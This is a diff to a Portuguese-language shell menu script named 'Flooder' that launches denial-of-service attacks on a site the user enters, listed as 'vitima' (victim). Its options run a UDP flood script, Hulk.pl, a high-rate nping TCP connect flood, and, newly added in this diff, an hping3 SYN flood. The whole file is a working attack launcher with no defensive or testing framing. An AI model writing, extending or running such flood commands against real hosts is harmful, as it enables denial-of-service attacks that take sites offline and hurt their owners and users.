@@ -5,7 +5,8 @@ echo "     \033[40;1;37m  Flooder  \033[0m"
 echo "\033[1;37mEscolha uma das opço?s:    \033[1;37mPara Sair Ctrl + C\033[1;33m
 [1] Flood.pl \033[1;30m(Flood UDP )\033[1;33m
 [2] Hulk.pl \033[1;30m(Hulk.pl )\033[1;33m
-[3] Nping \033[1;30m(TCP connect flood  )\033[;0m"
+[3] Nping \033[1;30m(TCP connect flood  )\033[1;33m
+[4] Hping3 \033[1;30m(Simple SYN flood  )\033[;0m"
 read -p ": " opcao
 
 case $opcao in
@@ -21,6 +22,10 @@ case $opcao in
  echo "Digite o site"
  read -p ": " vitima
  nping --tcp-connect -rate=90000 -c 900000 -q $vitima ;;
+4)
+ echo "Digite o site"
+ read -p ": " site
+ hping3 -S --flood -V $site ;;
  *)
   id > /dev/null 2> /dev/null
 esac
